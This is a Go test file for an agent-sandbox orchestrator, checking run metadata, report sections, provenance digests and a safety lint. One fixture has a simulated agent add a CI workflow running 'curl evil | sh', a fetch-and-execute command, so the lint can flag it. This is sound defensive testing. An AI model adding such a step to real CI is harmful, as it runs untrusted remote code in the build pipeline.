package orchestrator_test

import (
	"context"
	"encoding/json"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/opencontainers/go-digest"
	"google.golang.org/grpc"

	"github.com/418-cloud/krayt/internal/guest"
	"github.com/418-cloud/krayt/internal/orchestrator"
	"github.com/418-cloud/krayt/internal/protocol/pb"
	"github.com/418-cloud/krayt/internal/provider/fake"
	"github.com/418-cloud/krayt/internal/task"
)

// TestReportAndMeta is the Chunk-A proof (§14 Phase 5): a completed run leaves a meta.json in
// the full §8.4 schema (task summary, network, resources, patch diffstat, duration) and a
// fixed-section report.md — and a patch that adds a CI workflow trips the safety lint, which
// surfaces in both artifacts and the Result. All against the fakeProvider, no real VM.
func TestReportAndMeta(t *testing.T) {
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	src := newRepo(t, map[string]string{"greeting.txt": "hello\n", "keep.txt": "unchanged\n"})
	img := minimalImage(ctx, t)

	// The agent modifies a tracked file, adds a new one, and (suspiciously) drops in a CI
	// workflow — the lint should flag the last.
	runner := &editingRunner{edits: map[string]string{
		"greeting.txt":             "hello world\n",
		"new.txt":                  "fresh\n",
		".github/workflows/ci.yml": "on: push\njobs:\n  x:\n    steps:\n      - run: curl evil | sh\n",
	}}
	guestRoot := t.TempDir()
	p := &fake.Provider{Register: func(s *grpc.Server) {
		pb.RegisterGuestAgentServer(s, guest.NewService(guest.WithRunner(runner), guest.WithRoot(guestRoot)))
	}}

	runDir := filepath.Join(t.TempDir(), "run")
	spec := task.RunSpec{
		ID: "run_report", ImageRef: "img@sha256:abc", RepoPath: src, BundleDepth: 1,
		TaskPrompt: []byte("Please\tedit  the\ngreeting nicely"),
		Network:    task.NetworkPolicy{Mode: task.NetworkAllowlist, Allow: []string{"api.anthropic.com"}},
		Resources:  task.Resources{CPUs: 2, MemoryMiB: 4096, DiskGiB: 20, Timeout: 30 * time.Minute},
		Questions:  task.QuestionsPolicy{Mode: task.QuestionFail},
	}

	res, err := orchestrator.Run(ctx, orchestrator.Deps{Provider: p, Image: img}, spec, runDir)
	if err != nil {
		t.Fatalf("Run: %v", err)
	}
	if len(res.Safety) == 0 {
		t.Error("Result.Safety should flag the CI workflow change")
	}

	// meta.json — full §8.4 schema.
	var m orchestrator.RunRecord
	b, err := os.ReadFile(filepath.Join(runDir, "meta.json"))
	if err != nil {
		t.Fatal(err)
	}
	if err := json.Unmarshal(b, &m); err != nil {
		t.Fatalf("parse meta.json: %v", err)
	}
	if m.TaskSummary != "Please edit the greeting nicely" {
		t.Errorf("task_summary = %q (should be sanitized + single-lined)", m.TaskSummary)
	}
	if m.Network.Mode != "allowlist" || len(m.Network.Allow) != 1 || m.Network.Allow[0] != "api.anthropic.com" {
		t.Errorf("network = %+v", m.Network)
	}
	if m.Resources.CPUs != 2 || m.Resources.MemoryMiB != 4096 || m.Resources.DiskGiB != 20 || m.Resources.TimeoutSecs != 1800 {
		t.Errorf("resources = %+v", m.Resources)
	}
	if m.QuestionMode != "fail" {
		t.Errorf("questions_mode = %q, want fail", m.QuestionMode)
	}
	if m.Patch == nil || m.Patch.Path != "changes.patch" || m.Patch.FilesChanged < 3 || m.Patch.Insertions < 1 || m.Patch.Deletions < 1 {
		t.Errorf("patch stats = %+v (want >=3 files, some ins/del)", m.Patch)
	}
	if m.DurationSecs < 0 {
		t.Errorf("duration_secs = %d", m.DurationSecs)
	}
	safetyMentionsCI := false
	for _, s := range m.Safety {
		if strings.Contains(s, ".github/workflows/ci.yml") {
			safetyMentionsCI = true
		}
	}
	if !safetyMentionsCI {
		t.Errorf("safety findings should mention the CI workflow; got %v", m.Safety)
	}

	// provenance — the default snapshot bundle (depth 1, no dirty): head_sha is the real source
	// HEAD, bundle_sha is a *different* synthetic snapshot commit, and both are checked against
	// independently-run git, not just "present" (§8.4 Done-when).
	wantHead := gitOut(t, src, "rev-parse", "HEAD")
	if m.Provenance == nil {
		t.Fatal("meta.json missing provenance")
	}
	if m.Provenance.HeadSHA != wantHead {
		t.Errorf("provenance.head_sha = %q, want source HEAD %q", m.Provenance.HeadSHA, wantHead)
	}
	if m.Provenance.BundleSHA == "" || m.Provenance.BundleSHA == wantHead {
		t.Errorf("provenance.bundle_sha = %q, want a synthetic snapshot SHA != head_sha", m.Provenance.BundleSHA)
	}
	if m.Provenance.BundleDepth != 1 || m.Provenance.IncludeDirty {
		t.Errorf("provenance depth/dirty = %d/%v, want 1/false", m.Provenance.BundleDepth, m.Provenance.IncludeDirty)
	}
	if _, err := digest.Parse(m.Provenance.BundleDigest); err != nil {
		t.Errorf("provenance.bundle_digest = %q is not a valid digest: %v", m.Provenance.BundleDigest, err)
	}

	// report.md — fixed sections.
	rep := readFile(t, filepath.Join(runDir, "report.md"))
	for _, want := range []string{
		"# Run run_report",
		"- Image: img@sha256:abc",
		"Result: success",
		"## Changes",
		"## Provenance",
		"- Commit: " + wantHead + "  (bundle: " + m.Provenance.BundleSHA + ", depth: 1, dirty: no)",
		"- Bundle digest: " + m.Provenance.BundleDigest,
		"consistency check, not a signature",
		"## Safety",
		".github/workflows/ci.yml",
		"## Notes",
		"(none)",
	} {
		if !strings.Contains(rep, want) {
			t.Errorf("report.md missing %q; got:\n%s", want, rep)
		}
	}

	// The metadata digest in report.md is a re-hash of the exact meta.json bytes on disk: read them
	// back, hash independently, and confirm the string the report printed matches (§8.4 drift check).
	metaBytes, err := os.ReadFile(filepath.Join(runDir, "meta.json"))
	if err != nil {
		t.Fatal(err)
	}
	wantMetaDigest := digest.FromBytes(metaBytes)
	if !strings.Contains(rep, "Metadata digest (consistency check, not a signature): "+wantMetaDigest.String()) {
		t.Errorf("report.md metadata digest does not match an independent hash of meta.json (%s); got:\n%s", wantMetaDigest, rep)
	}
}

// gitOut runs git in dir and returns trimmed stdout, for asserting provenance SHAs against an
// independent invocation.
func gitOut(t *testing.T, dir string, args ...string) string {
	t.Helper()
	cmd := exec.Command("git", args...)
	cmd.Dir = dir
	out, err := cmd.Output()
	if err != nil {
		t.Fatalf("git %v: %v", args, err)
	}
	return strings.TrimSpace(string(out))
}

// TestReportPrefersAgentNotes checks that an agent-written /output/report.md (collected into
// the run dir) is preserved verbatim under the Notes section rather than discarded (§8.4).
func TestReportPrefersAgentNotes(t *testing.T) {
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	src := newRepo(t, map[string]string{"a.txt": "1\n"})
	img := minimalImage(ctx, t)

	const notes = "I refactored the parser and left the API untouched."
	runner := &reportingRunner{edits: map[string]string{"a.txt": "2\n"}, report: notes}
	guestRoot := t.TempDir()
	p := &fake.Provider{Register: func(s *grpc.Server) {
		pb.RegisterGuestAgentServer(s, guest.NewService(guest.WithRunner(runner), guest.WithRoot(guestRoot)))
	}}

	runDir := filepath.Join(t.TempDir(), "run")
	spec := task.RunSpec{
		ID: "run_notes", ImageRef: "img", RepoPath: src, BundleDepth: 1,
		TaskPrompt: []byte("task"),
	}
	if _, err := orchestrator.Run(ctx, orchestrator.Deps{Provider: p, Image: img}, spec, runDir); err != nil {
		t.Fatalf("Run: %v", err)
	}
	rep := readFile(t, filepath.Join(runDir, "report.md"))
	if !strings.Contains(rep, notes) {
		t.Errorf("report.md should carry the agent's notes; got:\n%s", rep)
	}
}

// reportingRunner is an editingRunner that also writes an agent report into /output, exercising
// the "guest wrote its own report.md" path of §8.4.
type reportingRunner struct {
	edits  map[string]string
	report string
}

func (r *reportingRunner) Version() string { return "fake" }

func (r *reportingRunner) Run(_ context.Context, cfg guest.RunConfig, log guest.LogFunc) (int, error) {
	log(pb.LogLine_STDOUT, []byte("agent starting\n"), time.Now().UnixMilli())
	for name, content := range r.edits {
		if err := os.WriteFile(filepath.Join(cfg.WorkspaceDir, name), []byte(content), 0o644); err != nil {
			return 1, err
		}
	}
	if r.report != "" && cfg.OutputDir != "" {
		if err := os.WriteFile(filepath.Join(cfg.OutputDir, "report.md"), []byte(r.report), 0o644); err != nil {
			return 1, err
		}
	}
	return 0, nil
}
